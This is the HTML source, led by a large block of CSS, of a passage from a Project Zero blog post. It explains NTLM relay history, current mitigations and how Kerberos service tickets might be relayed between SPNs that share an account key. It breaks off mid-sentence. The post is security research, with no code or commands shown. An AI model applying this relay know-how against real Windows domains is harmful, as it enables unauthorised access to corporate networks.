\"}ol.lst-kix_wkcrlfh2qk3l-5.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-5 0}ol.lst-kix_i2wckd3yhfhe-1.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-1 0}.lst-kix_i2wckd3yhfhe-7&gt;li:before{content:\"\" counter(lst-ctn-kix_i2wckd3yhfhe-7,lower-latin) \". \"}.lst-kix_i2wckd3yhfhe-6&gt;li:before{content:\"\" counter(lst-ctn-kix_i2wckd3yhfhe-6,decimal) \". \"}.lst-kix_jp16emg17n48-1&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-1}.lst-kix_d25vxsk234hv-4&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-4,lower-latin) \". \"}.lst-kix_wkcrlfh2qk3l-0&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-0,decimal) \". \"}.lst-kix_d25vxsk234hv-8&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-8}.lst-kix_jp16emg17n48-4&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-4}.lst-kix_d25vxsk234hv-3&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-3,decimal) \". \"}.lst-kix_d25vxsk234hv-5&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-5,lower-roman) \". \"}ol.lst-kix_i2wckd3yhfhe-6.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-6 0}.lst-kix_wkcrlfh2qk3l-1&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-1,lower-latin) \". \"}ol.lst-kix_wkcrlfh2qk3l-2.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-2 0}.lst-kix_d25vxsk234hv-7&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-7,lower-latin) \". \"}ol.lst-kix_d25vxsk234hv-4.start{counter-reset:lst-ctn-kix_d25vxsk234hv-4 0}.lst-kix_d25vxsk234hv-6&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-6,decimal) \". \"}.lst-kix_wkcrlfh2qk3l-6&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-6,decimal) \". \"}.lst-kix_fmj6vk2ylkib-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_fmj6vk2ylkib-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_wkcrlfh2qk3l-5&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-5,lower-roman) \". \"}.lst-kix_wkcrlfh2qk3l-0&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-0}.lst-kix_i2wckd3yhfhe-0&gt;li:before{content:\"\" counter(lst-ctn-kix_i2wckd3yhfhe-0,decimal) \") \"}.lst-kix_fmj6vk2ylkib-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_d25vxsk234hv-0&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-0,decimal) \". \"}.lst-kix_wkcrlfh2qk3l-3&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-3,decimal) \". \"}.lst-kix_wkcrlfh2qk3l-4&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-4,lower-latin) \". \"}ol.lst-kix_d25vxsk234hv-7.start{counter-reset:lst-ctn-kix_d25vxsk234hv-7 0}.lst-kix_wkcrlfh2qk3l-3&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-3}.lst-kix_fmj6vk2ylkib-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_fmj6vk2ylkib-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_d25vxsk234hv-1&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-1,lower-latin) \". \"}.lst-kix_d25vxsk234hv-2&gt;li:before{content:\"\" counter(lst-ctn-kix_d25vxsk234hv-2,lower-roman) \". \"}.lst-kix_wkcrlfh2qk3l-2&gt;li:before{content:\"\" counter(lst-ctn-kix_wkcrlfh2qk3l-2,lower-roman) \". \"}.lst-kix_wkcrlfh2qk3l-4&gt;li{counter-increment:lst-ctn-kix_wkcrlfh2qk3l-4}.lst-kix_d25vxsk234hv-1&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-1}ol.lst-kix_d25vxsk234hv-8.start{counter-reset:lst-ctn-kix_d25vxsk234hv-8 0}ol.lst-kix_d25vxsk234hv-1.start{counter-reset:lst-ctn-kix_d25vxsk234hv-1 0}.lst-kix_d25vxsk234hv-7&gt;li{counter-increment:lst-ctn-kix_d25vxsk234hv-7}.lst-kix_i2wckd3yhfhe-3&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-3}.lst-kix_jp16emg17n48-5&gt;li{counter-increment:lst-ctn-kix_jp16emg17n48-5}ol.lst-kix_jp16emg17n48-7.start{counter-reset:lst-ctn-kix_jp16emg17n48-7 0}ol.lst-kix_wkcrlfh2qk3l-4{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-0.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-0 0}ol.lst-kix_wkcrlfh2qk3l-3{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-2{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-1{list-style-type:none}.lst-kix_i2wckd3yhfhe-8&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-8}ol.lst-kix_wkcrlfh2qk3l-0{list-style-type:none}ol.lst-kix_jp16emg17n48-1.start{counter-reset:lst-ctn-kix_jp16emg17n48-1 0}ol.lst-kix_i2wckd3yhfhe-4.start{counter-reset:lst-ctn-kix_i2wckd3yhfhe-4 0}ol.lst-kix_wkcrlfh2qk3l-8{list-style-type:none}.lst-kix_i2wckd3yhfhe-2&gt;li{counter-increment:lst-ctn-kix_i2wckd3yhfhe-2}ol.lst-kix_wkcrlfh2qk3l-7{list-style-type:none}.lst-kix_2yktnm17nyl7-4&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_wkcrlfh2qk3l-6{list-style-type:none}ol.lst-kix_wkcrlfh2qk3l-5{list-style-type:none}ol.lst-kix_d25vxsk234hv-2.start{counter-reset:lst-ctn-kix_d25vxsk234hv-2 0}.lst-kix_2yktnm17nyl7-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2yktnm17nyl7-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_2yktnm17nyl7-7&gt;li:before{content:\"\\0025cb  \"}ol.lst-kix_wkcrlfh2qk3l-7.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-7 0}.lst-kix_2yktnm17nyl7-8&gt;li:before{content:\"\\0025a0  \"}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_wkcrlfh2qk3l-1.start{counter-reset:lst-ctn-kix_wkcrlfh2qk3l-1 0}ol.lst-kix_jp16emg17n48-0.start{counter-reset:lst-ctn-kix_jp16emg17n48-0 0}ol{margin:0;padding:0}table td,table th{padding:0}.c29{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:49.5pt;border-top-color:#000000;border-bottom-style:solid}.c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:66.8pt;border-top-color:#000000;border-bottom-style:solid}.c11{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.c22{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:87pt;border-top-color:#000000;border-bottom-style:solid}.c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:81pt;border-top-color:#000000;border-bottom-style:solid}.c15{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:164.2pt;border-top-color:#000000;border-bottom-style:solid}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.c26{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c31{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:\"Arial\";font-style:normal}.c32{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c39{-webkit-text-decoration-skip:none;color:#000000;text-decoration:line-through;vertical-align:baseline;text-decoration-skip-ink:none;font-style:normal}.c38{color:#000000;text-decoration:none;vertical-align:super;font-style:normal}.c21{border-spacing:0;border-collapse:collapse;margin-right:auto}.c7{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c6{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.c8{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c25{font-weight:400;font-size:11pt;font-family:\"Arial\"}.c37{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c19{font-weight:400;font-size:16pt;font-family:\"Arial\"}.c2{font-size:10pt;font-family:\"Courier New\";font-weight:400}.c12{font-weight:400;font-size:11pt;font-family:\"Courier New\"}.c40{font-weight:400;font-size:10pt;font-family:\"Arial\"}.c14{color:#000000;text-decoration:none;vertical-align:baseline}.c42{font-family:\"Courier New\";font-weight:400}.c16{border:1px solid black;margin:5px}.c18{margin-left:36pt;padding-left:0pt}.c5{color:inherit;text-decoration:inherit}.c24{padding:0;margin:0}.c28{background-color:#ffff00}.c33{background-color:#cccccc}.c9{height:11pt}.c17{color:#696969}.c34{color:#000080}.c4{font-style:italic}.c13{color:#0000ff}.c35{color:#8a2be2}.c36{color:#a31515}.c23{color:#a82d00}.c20{height:0pt}.c41{vertical-align:super}.c27{color:#8b0000}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c37\"&gt;&lt;div&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;Posted by James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;This blog post is a summary of some research I&amp;#39;ve been doing into relaying Kerberos authentication in Windows domain environments. To keep this blog shorter I am going to assume you have a working knowledge of Windows network authentication, and specifically Kerberos and NTLM. For a quick primer on Kerberos see &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13\"&gt;this page&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is part of Microsoft&amp;#39;s Kerberos extension documentation or you can always read &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://www.rfc-editor.org/rfc/rfc4120.txt\"&gt;RFC4120&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.yuh7isexpwgo\"&gt;&lt;span class=\"c6 c19\"&gt;Background&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Windows based enterprise networks rely on network authentication protocols, such as &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b38c36ed-2804-4868-a9ff-8dd3182128e4\"&gt;NT Lan Manager (NTLM)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and Kerberos to implement single sign on. These protocols allow domain users to seamlessly connect to corporate resources without having to repeatedly enter their passwords. This works by the computer&amp;#39;s &lt;/span&gt;&lt;span class=\"c4\"&gt;Local Security Authority (LSA)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;process storing the user&amp;#39;s credentials when the user first authenticates. The LSA can then reuse those credentials for network authentication without requiring user interaction.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;However, the convenience of not prompting the user for their credentials when performing network authentication has a downside. To be most useful, common clients for network protocols such as HTTP or SMB must automatically perform the authentication without user interaction otherwise it defeats the purpose of avoiding asking the user for their credentials. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;This automatic authentication can be a problem if an attacker can trick a user into connecting to a server they control. The attacker could induce the user&amp;#39;s network client to start an authentication process and use that information to authenticate to an unrelated service allowing the attacker to access that service&amp;#39;s resources as the user. When the authentication protocol is captured and forwarded to another system in this way it&amp;#39;s referred to as an Authentication Relay attack.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c25 c14 c4\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s856\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/a/AVvXsEjeIXhBwnBcGsUREqJ9YPAEyeTw99GDlcn_PmW7fyuxGGkop9HvtErkOKfvy6WXzeXZFfXdOR8C-StQgu3qPaE-t48EHnQ0xPbUgBDm3-jyO_dij-bFHf4Vw6v-ryL9D7FixnLa6I88bzvbkx-QNGx7Wxhc3GGWmJGa9Xbu1-HIZGM0SA1HQWcERC_y2w=s856\" border=\"0\" alt=\"Simple diagram of an authentication relay attack\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Authentication relay attacks using the NTLM protocol were &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://web.archive.org/web/20030706050349/http://www.xfocus.net/articles/200305/smbrelay.html\"&gt;f&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://web.archive.org/web/20030706050349/http://www.xfocus.net/articles/200305/smbrelay.html\"&gt;irst published&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;all the way back in 2001 by Josh Buchbinder (Sir Dystic) of the Cult of the Dead Cow&lt;/span&gt;&lt;span&gt;. However, even in 2021 NTLM relay attacks still represent a threat in default configurations of Windows domain networks. The most recent major abuse of NTLM relay was through the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://specterops.io/assets/resources/Certified_Pre-Owned.pdf\"&gt;Active Directory Certificate Services web enrollment service&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This combined with the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/topotam/PetitPotam\"&gt;PetitPotam&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;technique to induce a Domain Controller to perform NTLM authentication allows for a Windows domain to be compromised by an unauthenticated attacker.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Over the years Microsoft has made many efforts to mitigate authentication relay attacks. The best mitigations rely on the fact that the attacker does not have knowledge of the user&amp;#39;s password or control over the authentication process. This includes signing and encryption (sealing) of network traffic using a session key which is protected by the user&amp;#39;s password or channel binding as part of &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/\"&gt;Extended Protection for Authentication (EPA)&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;which prevents relay of authentication to a network protocol under TLS.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Another mitigation regularly proposed is to disable NTLM authentication either for particular services or network wide using &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain\"&gt;Group Policy&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;. While this has potential compatibility issues, restricting authentication to only Kerberos should be more secure. That got me thinking, is disabling NTLM sufficient to eliminate authentication relay attacks on Windows domains?&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c26\" id=\"h.58jp1dccho9f\"&gt;&lt;span class=\"c6 c19\"&gt;Why are there no Kerberos Relay Attacks?&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The obvious question is, if NTLM is disabled could you relay Kerberos authentication instead? Searching for Kerberos Relay attacks doesn&amp;#39;t yield much public research that I could find. There is the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/dirkjanm/krbrelayx\"&gt;krbrelayx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;tool written by &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://twitter.com/_dirkjan\"&gt;Dirk-jan&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is similar in concept to the &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/SecureAuthCorp/impacket/tree/master/impacket/examples/ntlmrelayx\"&gt;ntlmrelayx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;tool in &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://github.com/SecureAuthCorp/impacket\"&gt;impacket&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, a common tool for performing NTLM authentication relay attacks&lt;/span&gt;&lt;span&gt;. However as the accompanying &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;makes clear this is a tool to abuse &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/defender-for-identity/cas-isp-unconstrained-kerberos\"&gt;unconstrained delegation&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;rather than relay the authentication. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;I did find a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf\"&gt;recent presentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;by Sagi Sheinfeld, &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://twitter.com/eyal_karni\"&gt;Eyal Karni&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://twitter.com/YaronZi\"&gt;Yaron Zinar&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from Crowdstrike at Defcon 29 (and also coming up at Blackhat EU 2021) which relayed Kerberos authentication. The presentation discussed MitM network traffic to specific servers, then relaying the Kerberos authentication. A MitM attack relies on being able to spoof an existing server through some mechanism, which is a well known risk. &amp;nbsp;The last line in the presentation is &lt;/span&gt;&lt;span class=\"c4\"&gt;&amp;quot;Microsoft Recommendation: Avoid being MITM&amp;rsquo;d&amp;hellip;&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which seems a &lt;/span&gt;&lt;span&gt;reasonable approach to take if possible&lt;/span&gt;&lt;span class=\"c3\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c3\"&gt;However a MitM attack is slightly different to the common NTLM relay attack scenario where you can induce a domain joined system to authenticate to a server an attacker controls and then forward that authentication to an unrelated service. NTLM is easy to relay as it wasn&amp;#39;t designed to distinguish authentication to a particular service from any other. The only unique aspect was the server (and later client) challenge but that value wasn&amp;#39;t specific to the service and so authentication for say SMB could be forwarded to HTTP and the victim service couldn&amp;#39;t tell the difference. Subsequently EPA has been retrofitted onto NTLM to make the authentication specific to a service, but due to backwards compatibility these mitigations aren&amp;#39;t always used.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;On the other hand Kerberos has always required the target of the authentication to be specified beforehand through a &lt;/span&gt;&lt;span class=\"c4\"&gt;principal name&lt;/span&gt;&lt;span&gt;, typically this is a &lt;/span&gt;&lt;span class=\"c8\"&gt;&lt;a class=\"c51\" href=\"https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names\"&gt;Service Principal Name (SPN)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;although in certain circumstances it can be a &lt;/span&gt;&lt;span class=\"c4\"&gt;User Principal Name (UPN)&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The SPN is usually represented as a string of the form &lt;/span&gt;&lt;span class=\"c4\"&gt;CLASS/INSTANCE:PORT/NAME&lt;/span&gt;&lt;span&gt;, where &lt;/span&gt;&lt;span class=\"c4\"&gt;CLASS&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the class of service, such as &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"c4\"&gt;CIFS&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c4\"&gt;INSTANCE &lt;/span&gt;&lt;span&gt;is typically the DNS name of the server hosting the service and &lt;/span&gt;&lt;span class=\"c4\"&gt;PORT&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;NAME&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;are optional.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The SPN is used by the Kerberos &lt;/span&gt;&lt;span class=\"c4\"&gt;Ticket Granting Server (TGS)&lt;/span&gt;&lt;span&gt;&amp;nbsp;to select the shared encryption key for a Kerberos service ticket generated for the authentication. This ticket contains the details of the authenticating user based on the contents of the &lt;/span&gt;&lt;span class=\"c4\"&gt;Ticket Granting Ticket (TGT)&lt;/span&gt;&lt;span&gt;&amp;nbsp;that was requested during the user&amp;#39;s initial Kerberos authentication process. The client can then package the service&amp;#39;s ticket into an &lt;/span&gt;&lt;span class=\"c4\"&gt;Authentication Protocol Request (AP_REQ)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;authentication token to send to the server.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;Without knowledge of the shared encryption key the Kerberos service ticket can&amp;#39;t be decrypted by the service and the authentication fails. Therefore if Kerberos authentication is attempted to an SMB service with the SPN &lt;/span&gt;&lt;span class=\"c4\"&gt;CIFS/fileserver.domain.com&lt;/span&gt;&lt;span&gt;, then that ticket shouldn&amp;#39;t be usable if the relay target is a HTTP service with the SPN &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP/fileserver.domain.com&lt;/span&gt;&lt;span&gt;, as the shared key should be different.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;In practice that&amp;#39;s rarely the case in Windows domain networks. The Domain Controller associates the SPN with a user account, most commonly the computer account of the domain joined server and the key is derived from the account&amp;#39;s password. The &lt;/span&gt;&lt;span class=\"c4\"&gt;CIFS/fileserver.domain.com&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c4\"&gt;HTTP/fileserver.domain.com &lt;/span&gt;&lt;span&gt;SPNs would likely be assigned to the &lt;/span&gt;&lt;span class=\"c4\"&gt;FILESERVER$&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;computer account, therefore the shared encryption key will be the same for both SPNs and in theory the authentication could be relayed from one service to the other. The receiving service could query for the authenticated SPN string from the authentication APIs and then compare it to its expected value, but this check is typically optional.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c9\"&gt;&lt;span class=\"c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span&gt;The selection of the SPN to use for the Kerberos authentication is typically defined by the target server&amp;#39;s host name. In a relay attack the attacker&amp;#39;s server will not be the same as the target. For example, the SMB connection might be targeting the attacker&amp;#39;s server, and will assign the SPN &lt;/span&gt;&lt;span class=\"c4\"&gt;CIFS/evil.com&lt;/span&gt;&lt;span&gt;. Assuming this SPN is even registered it would in all probability have a different shared encryption key to the &lt;/span&gt;&lt;span class=\"c4\"&gt;CIFS/fileserver.domain.com &lt;/span&gt;&lt;span&gt;SPN due to the different computer accounts. Therefore relaying the authentication to the 